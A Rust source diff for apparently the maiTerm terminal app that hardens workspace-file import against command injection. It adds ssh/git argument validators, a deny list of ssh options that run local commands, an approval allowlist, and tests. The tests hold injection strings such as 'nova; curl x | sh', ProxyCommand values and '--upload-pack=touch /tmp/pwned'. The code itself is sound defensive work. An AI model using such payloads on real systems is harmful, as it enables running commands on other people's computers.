@@ -38,6 +38,10 @@ pub struct ShareFile {
     pub notes: Option<SharedNotes>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub tasks: Option<SharedTasks>,
+    /// What `parse` took out of the file as unsafe to run (§4.2), for the wizard to show. Never
+    /// read from a file: a sender can't pre-fill it, and an export leaves it empty.
+    #[serde(skip_deserializing, default, skip_serializing_if = "Vec::is_empty")]
+    pub refused: Vec<String>,
 }
 
 #[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
@@ -215,9 +219,13 @@ pub fn write_file(file: &ShareFile, path: &Path) -> Result<(), String> {
 
 /// Read a share file — gzip'd or plain JSON, sniffed by content rather than trusted to the
 /// extension. A newer version is refused whole, never partially imported (§6).
-pub fn read_file(path: &Path) -> Result<ShareFile, String> {
+/// The file and a digest of its bytes. The wizard reviews one read and builds from another; the
+/// digest is how the build knows it's the file the human approved (§4.2).
+pub fn read_file(path: &Path) -> Result<(ShareFile, String), String> {
+    use sha2::Digest;
     use std::io::Read;
     let bytes = std::fs::read(path).map_err(|e| format!("Couldn't read {}: {e}", path.display()))?;
+    let digest = sha2::Sha256::digest(&bytes).iter().map(|b| format!("{b:02x}")).collect();
     let text = if bytes.starts_with(&[0x1f, 0x8b]) {
         let mut s = String::new();
         flate2::read::GzDecoder::new(&bytes[..])
@@ -227,7 +235,7 @@ pub fn read_file(path: &Path) -> Result<ShareFile, String> {
     } else {
         String::from_utf8(bytes).map_err(|_| "This isn't a maiTerm workspace file".to_string())?
     };
-    parse(&text)
+    Ok((parse(&text)?, digest))
 }
 
 pub fn parse(text: &str) -> Result<ShareFile, String> {
@@ -242,7 +250,121 @@ pub fn parse(text: &str) -> Result<ShareFile, String> {
             "This workspace was shared from a newer maiTerm (format v{version}). Update maiTerm to import it."
         ));
     }
-    serde_json::from_value(value).map_err(|e| format!("The workspace file is damaged: {e}"))
+    let mut file: ShareFile =
+        serde_json::from_value(value).map_err(|e| format!("The workspace file is damaged: {e}"))?;
+    sanitize(&mut file);
+    Ok(file)
+}
+
+// ── What a file may make this computer run (§4.2) ────────────────────────────────────────────
+//
+// A shared file comes from someone else, and opens on a double-click. The commands in it that are
+// commands by nature (auto-resume, services) are shown to the human and run only if approved.
+// What's here is the rest: fields that are NOT meant to be commands but are pasted into one — an
+// ssh target and a remote directory typed into the local shell, a session id typed after
+// `claude --resume`, a URL handed to git. Those are refused outright, not reviewed, because the
+// review shows them as a host or an id and a reader can't be expected to spot `nova; curl …`
+// in a host field.
+
+/// Characters that are plain in a shell word. Anything else in an ssh target or remote
+/// directory ends the word, starts an expansion or quotes — so the value isn't what it looks like.
+fn shell_plain(c: char) -> bool {
+    c.is_alphanumeric() || "@._:/=,+%~-".contains(c)
+}
+
+/// Why this ssh command can't be typed into the receiver's shell, if it can't. Besides shell
+/// syntax, a few ssh options run a LOCAL command with no shell characters at all
+/// (`-oProxyCommand=…`), or pull one in from a file (`-F`).
+pub fn ssh_refusal(cmd: &str) -> Option<String> {
+    if cmd.trim().is_empty() {
+        return Some("it's empty".to_string());
+    }
+    if let Some(c) = cmd.chars().find(|&c| c != ' ' && !shell_plain(c)) {
+        return Some(format!("it contains {c:?}, which the shell would act on"));
+    }
+    const RUNS_LOCALLY: [&str; 6] = ["proxycommand", "localcommand", "permitlocalcommand", "knownhostscommand", "match", "include"];
+    // An option can arrive as `-oName=v`, `-o Name=v`, `-o Name v`, or inside a cluster
+    // (`-vo Name=v`), so a token counts as one when it is a flag, carries `=`, or follows a
+    // cluster ending in `o`. A bare `matchbox` host is none of those.
+    let tokens: Vec<&str> = cmd.split(' ').filter(|t| !t.is_empty()).collect();
+    for (i, t) in tokens.iter().enumerate() {
+        let lc = t.to_ascii_lowercase();
+        let after_o = i > 0 && tokens[i - 1].starts_with('-') && tokens[i - 1].ends_with('o');
+        if t.starts_with('-') || t.contains('=') || after_o {
+            if let Some(k) = RUNS_LOCALLY.iter().find(|k| lc.contains(*k)) {
+                return Some(format!("its {k} option runs a command on this computer"));
+            }
+        }
+        // Single-letter flags before any `o` in a cluster; what follows `o` is an option name.
+        if let Some(flags) = t.strip_prefix('-').filter(|f| !f.starts_with('-')) {
+            let flags = flags.split('o').next().unwrap_or("");
+            if flags.contains('F') || flags.contains('E') {
+                return Some(format!("its {t} flag reads or writes a file on this computer"));
+            }
+        }
+    }
+    None
+}
+
+/// A remote directory goes inside the single-quoted remote command maiTerm types locally
+/// (`buildSshCommand`), where a quote, space or `;` in it lands in the LOCAL shell.
+fn remote_dir_refusal(dir: &str) -> Option<String> {
+    dir.chars().find(|&c| !shell_plain(c)).map(|c| format!("it contains {c:?}"))
+}
+
+/// Session ids are typed after `claude --resume`/`codex fork`: uuids, nothing else.
+fn session_id_ok(id: &str) -> bool {
+    !id.is_empty() && id.len() <= 128 && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+}
+
+/// A URL or branch starting with `-` is an option to git (`--upload-pack=<cmd>`).
+fn git_arg_ok(s: &str) -> bool {
+    !s.starts_with('-') && !s.chars().any(char::is_control)
+}
+
+fn sanitize(file: &mut ShareFile) {
+    let mut refused = Vec::new();
+    for root in &mut file.roots {
+        let before = root.remotes.len();
+        root.remotes.retain(|_, url| git_arg_ok(url));
+        if root.remotes.len() < before {
+            refused.push(format!("{}: a repository address that git would read as an option", root.path));
+        }
+        if root.branch.as_deref().is_some_and(|b| !git_arg_ok(b)) {
+            refused.push(format!("{}: a branch name that git would read as an option", root.path));
+            root.branch = None;
+        }
+        if root.kind == RootKind::Git && root.remotes.is_empty() {
+            root.kind = RootKind::Plain;
+        }
+    }
+    for pane in &mut file.workspace.panes {
+        pane.tabs.retain_mut(|tab| {
+            let bad_ssh = match &tab.kind {
+                SharedTabKind::Remote { ssh_command, remote_cwd } => ssh_refusal(ssh_command)
+                    .map(|why| format!("its ssh command ({ssh_command}): {why}"))
+                    .or_else(|| {
+                        remote_cwd.as_deref().and_then(|d| remote_dir_refusal(d).map(|why| format!("its remote directory ({d}): {why}")))
+                    }),
+                SharedTabKind::RemoteEditor { ssh_command, .. } => {
+                    ssh_refusal(ssh_command).map(|why| format!("its ssh command ({ssh_command}): {why}"))
+                }
+                _ => None,
+            };
+            if let Some(why) = bad_ssh {
+                refused.push(format!("Tab “{}” was left out — {why}", tab.name));
+                return false;
+            }
+            if let Some(agent) = &mut tab.agent {
+                if agent.session_id.as_deref().is_some_and(|id| !session_id_ok(id)) {
+                    refused.push(format!("Tab “{}”: its session id isn't one, so its agent starts fresh", tab.name));
+                    agent.session_id = None;
+                }
+            }
+            true
+        });
+    }
+    file.refused = refused;
 }
 
 // ── Paths ────────────────────────────────────────────────────────────────────────────────
@@ -815,6 +937,7 @@ fn build(ws: &Workspace, contexts: &[TabShareContext], opts: &ExportOptions, for
         services,
         notes,
         tasks,
+        refused: Vec::new(),
     };
     Built { file, table, previews }
 }
@@ -870,6 +993,26 @@ pub struct ImportOptions {
     /// service index → var name → value, for values the sender didn't send.
     #[serde(default)]
     pub env_values: HashMap<usize, HashMap<String, String>>,
+    /// The commands the human approved in the wizard's review (§4.2), by `review_key`. An
+    /// allowlist: a command this build would run that the review never listed isn't in it, so
+    /// it doesn't run.
+    #[serde(default)]
+    pub approved: std::collections::HashSet<String>,
+    /// `read_file`'s digest of the file the human reviewed. The build refuses a file that has
+    /// changed since.
+    #[serde(default)]
+    pub digest: String,
+}
+
+/// The id a reviewed command is approved under. `what` is `resume` (a tab's auto-resume
+/// command), `ssh` (a remote tab's connection), or `agent` (an agent tab's start).
+pub fn tab_review_key(tab_id: &str, what: &str) -> String {
+    format!("tab:{tab_id}:{what}")
+}
+
+/// A service starting by itself when the workspace opens.
+pub fn service_start_key(index: usize) -> String {
+    format!("service:{index}:start")
 }
 
 /// An agent tab the frontend must start once the workspace is in the store (§5). Commands
@@ -950,7 +1093,21 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
         pane_map.insert(sp.id.clone(), pane_id.clone());
         let mut tabs = Vec::new();
         for st in &sp.tabs {
-            let mut tab = match &st.kind {
+            let approved = |what: &str| opts.approved.contains(&tab_review_key(&st.id, what));
+            // Unapproved, a remote tab keeps its place as a plain local shell rather than
+            // vanishing; the agent in it can't start either, it was going to start over ssh.
+            let ssh_ok = approved("ssh");
+            let resume = st.auto_resume.as_ref().map(|ar| SharedAutoResume {
+                command: ar.command.clone().filter(|_| approved("resume")),
+                remembered_command: ar.remembered_command.clone().filter(|_| approved("resume")),
+                ..ar.clone()
+            });
+            let remote_declined = matches!(st.kind, SharedTabKind::Remote { .. }) && !ssh_ok;
+            if remote_declined {
+                notices.push(format!("“{}” opens as a local shell: its ssh connection wasn't approved", st.name));
+            }
+            let kind = if remote_declined { SharedTabKind::Local { location: None } } else { st.kind.clone() };
+            let mut tab = match &kind {
                 SharedTabKind::Editor { location, language } => {
                     let Some(path) = resolve(location, false, &mut notices) else { continue };
                     Tab::new_editor(
@@ -963,6 +1120,10 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
                             language: language.clone(),
                         },
                     )
+                }
+                SharedTabKind::RemoteEditor { .. } if !ssh_ok => {
+                    notices.push(format!("“{}” was left out: opening it over ssh wasn't approved", st.name));
+                    continue;
                 }
                 SharedTabKind::RemoteEditor { ssh_command, remote_path, file_path, language } => Tab::new_editor(
                     st.name.clone(),
@@ -982,7 +1143,8 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
                         .map(|p| p.to_string_lossy().to_string());
                     t.restore_cwd = cwd.clone();
                     t.last_cwd = cwd.clone();
-                    if let Some(ar) = &st.auto_resume {
+                    // A declined remote tab's resume command was written for the remote host.
+                    if let Some(ar) = resume.as_ref().filter(|_| !remote_declined) {
                         t.auto_resume_cwd = cwd;
                         apply_auto_resume(&mut t, ar);
                     }
@@ -992,7 +1154,7 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
                     let mut t = Tab::new(st.name.clone());
                     t.restore_ssh_command = Some(ssh_command.clone());
                     t.restore_remote_cwd = remote_cwd.clone();
-                    if let Some(ar) = &st.auto_resume {
+                    if let Some(ar) = &resume {
                         t.auto_resume_ssh_command = Some(ssh_command.clone());
                         t.auto_resume_remote_cwd = remote_cwd.clone();
                         apply_auto_resume(&mut t, ar);
@@ -1005,7 +1167,7 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
                 tab.mesh_purpose = st.mesh_purpose.clone();
             }
             tab.import_highlight = true;
-            if let Some(agent) = &st.agent {
+            if let Some(agent) = st.agent.as_ref().filter(|_| approved("agent") && !remote_declined) {
                 tab.runtime = Some(agent.runtime);
                 let remote = matches!(st.kind, SharedTabKind::Remote { .. });
                 launches.push(AgentLaunch {
@@ -1088,7 +1250,8 @@ pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
                     })
                     .collect(),
                 ssh_command: None,
-                auto_start: s.auto_start,
+                // Starting on its own is the one way a service runs without a click (§4.2).
+                auto_start: s.auto_start && opts.approved.contains(&service_start_key(i)),
                 restart: s.restart.clone(),
                 ready_pattern: s.ready_pattern.clone(),
                 port: None,
@@ -1273,6 +1436,102 @@ mod tests {
             other => panic!("unexpected split root {other:?}"),
         }
         let _ = std::fs::remove_dir_all(&target);
+    }
+
+    #[test]
+    fn ssh_targets_that_would_run_something_locally_are_refused() {
+        for ok in ["ews@nova", "-p 2222 ews@nova", "-i ~/.ssh/id_ed25519 -J bastion ews@nova", "matchbox.local", "-o ServerAliveInterval=30 ews@nova", "-oUserKnownHostsFile=/dev/null ews@nova"] {
+            assert_eq!(ssh_refusal(ok), None, "{ok}");
+        }
+        for bad in [
+            "nova; curl x | sh",
+            "nova && id",
+            "nova $(id)",
+            "nova `id`",
+            "nova\nid",
+            "'nova'",
+            "-oProxyCommand=/tmp/x nova",
+            "-o ProxyCommand=/tmp/x nova",
+            "-vo ProxyCommand=/tmp/x nova",
+            "-o LocalCommand=/tmp/x -o PermitLocalCommand=yes nova",
+            "-F /tmp/evil_config nova",
+            "-vF/tmp/evil nova",
+            "-E /tmp/log nova",
+            "",
+        ] {
+            assert!(ssh_refusal(bad).is_some(), "{bad:?} should be refused");
+        }
+    }
+
+    /// A hand-crafted file (§4.2): everything in it that isn't meant to be a command but would be
+    /// typed into one is taken out at parse, and says so.
+    #[test]
+    fn a_crafted_file_loses_what_would_inject() {
+        let text = r#"{
+          "format": "maiterm-workspace", "version": 1, "exported_at": "x", "maiterm_version": "x",
+          "refused": ["pre-filled by the sender"],
+          "workspace": { "name": "evil", "panes": [ { "id": "p", "name": "p", "tabs": [
+            { "id": "a", "name": "semi", "kind": { "type": "remote", "ssh_command": "nova; curl x | sh" } },
+            { "id": "b", "name": "proxy", "kind": { "type": "remote", "ssh_command": "-oProxyCommand=/tmp/x nova" } },
+            { "id": "c", "name": "cwd", "kind": { "type": "remote", "ssh_command": "nova", "remote_cwd": "x'; id; '" } },
+            { "id": "d", "name": "sid", "kind": { "type": "remote", "ssh_command": "nova" }, "agent": { "runtime": "claude", "session_id": "x; id" } },
+            { "id": "e", "name": "editor", "kind": { "type": "remote_editor", "ssh_command": "nova|id", "remote_path": "/x", "file_path": "x" } }
+          ] } ] },
+          "roots": [ { "id": "r", "path": "~/x", "kind": "git", "remotes": { "origin": "--upload-pack=touch /tmp/pwned" }, "branch": "--upload-pack=x" } ]
+        }"#;
+        let file = parse(text).unwrap();
+        let names: Vec<&str> = file.workspace.panes[0].tabs.iter().map(|t| t.name.as_str()).collect();
+        assert_eq!(names, vec!["sid"]);
+        assert_eq!(file.workspace.panes[0].tabs[0].agent.as_ref().unwrap().session_id, None);
+        assert!(file.roots[0].remotes.is_empty());
+        assert_eq!(file.roots[0].branch, None);
+        assert_eq!(file.roots[0].kind, RootKind::Plain);
+        assert!(!file.refused.iter().any(|r| r.contains("pre-filled")), "a sender can't write the refusal list");
+        assert_eq!(file.refused.len(), 7, "{:#?}", file.refused);
+    }
+
+    #[test]
+    fn nothing_runs_that_wasnt_approved() {
+        let ws = sample_ws();
+        let remote_id = ws.panes[0].tabs[1].id.clone();
+        let mut file = export_file(&ws, &[], &ExportOptions { agent_tab_ids: vec![remote_id.clone()], ..Default::default() });
+        file.workspace.panes[0].tabs[0].auto_resume =
+            Some(SharedAutoResume { enabled: true, pinned: false, command: Some("npm run dev".to_string()), remembered_command: None });
+        file.services.push(SharedService {
+            name: "api".to_string(),
+            command: "make api".to_string(),
+            location: None,
+            env: vec![],
+            auto_start: true,
+            restart: "never".to_string(),
+            ready_pattern: None,
+        });
+        let local = file.workspace.panes[0].tabs[0].id.clone();
+        let remote = file.workspace.panes[0].tabs[1].id.clone();
+
+        let none = build_workspace(&file, &ImportOptions { services: vec![0], ..Default::default() });
+        let tabs = &none.workspace.panes[0].tabs;
+        assert_eq!(tabs[0].auto_resume_command, None);
+        assert_eq!(tabs[1].restore_ssh_command, None, "an unapproved remote tab is a local shell");
+        assert_eq!(tabs[1].auto_resume_command, None, "and never runs the remote's resume command locally");
+        assert!(none.launches.is_empty());
+        assert!(!none.workspace.stack[0].auto_start);
+
+        let approved = [
+            tab_review_key(&local, "resume"),
+            tab_review_key(&remote, "ssh"),
+            tab_review_key(&remote, "resume"),
+            tab_review_key(&remote, "agent"),
+            service_start_key(0),
+        ];
+        let all = build_workspace(&file, &ImportOptions { services: vec![0], approved: approved.into_iter().collect(), ..Default::default() });
+        let tabs = &all.workspace.panes[0].tabs;
+        assert_eq!(tabs[0].auto_resume_command.as_deref(), Some("npm run dev"));
+        assert_eq!(tabs[1].restore_ssh_command.as_deref(), Some("ews@nova"));
+        assert!(tabs[1].auto_resume_command.is_some());
+        assert_eq!(all.launches.len(), 1);
+        assert_eq!(all.launches[0].fork_session_id.as_deref(), Some("11111111-aaaa"));
+        assert!(all.workspace.stack[0].auto_start);
     }
 
     #[test]
